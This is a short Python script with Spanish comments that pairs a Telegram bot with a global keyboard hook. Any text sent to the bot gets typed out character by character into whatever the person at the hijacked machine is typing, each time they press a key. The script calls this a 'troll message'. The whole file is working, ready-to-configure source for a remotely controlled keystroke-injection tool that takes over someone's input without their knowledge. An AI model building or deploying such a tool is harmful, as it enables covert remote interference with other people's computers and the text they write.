import telebot
from pynput.keyboard import Listener, Controller
import threading
import time

# Token del bot de Telegram y el ID del destinatario inicial
TOKEN = 'TOKEN_BOT_TELEGRAM'
DESTINATION_CHAT_ID = "ID_PERSONAL_REMPLAZAR"


# Inicializar el bot de Telegram
bot = telebot.TeleBot(TOKEN)

# Almacenar el mensaje recibido del usuario
user_message = None
message_pointer = 0  # Indica qué parte del mensaje mostrar

# Controlador de teclado para simular pulsaciones de teclas
keyboard = Controller()

#inicia el bot con el comando /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Bot activado, ingrese palabra:")

#Manejador para mensajes de texto
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global user_message, message_pointer
    user_message = message.text  #Almacenar el mensaje enviado por el usuario
    message_pointer = 0  #Reiniciar el mensaje, Servira para no junrae mensajes
    bot.send_message(message.chat.id, f"MENSAJE TROLL: {user_message}")

#Detectar entrada del teclado
def on_press(key):
    global message_pointer

    if user_message and message_pointer < len(user_message):
        char_to_type = user_message[message_pointer]
        keyboard.press(char_to_type)
        keyboard.release(char_to_type)
        time.sleep(0.1)  #Simular una escritura humana
        message_pointer += 1  #Mover al siguiente carácter

#Iniciar el bot en un hilo separado
def start_bot():
    bot.polling()

threading.Thread(target=start_bot).start()

#Escuchar entradas del teclado
with Listener(on_press=on_press) as listener:
    listener.join()
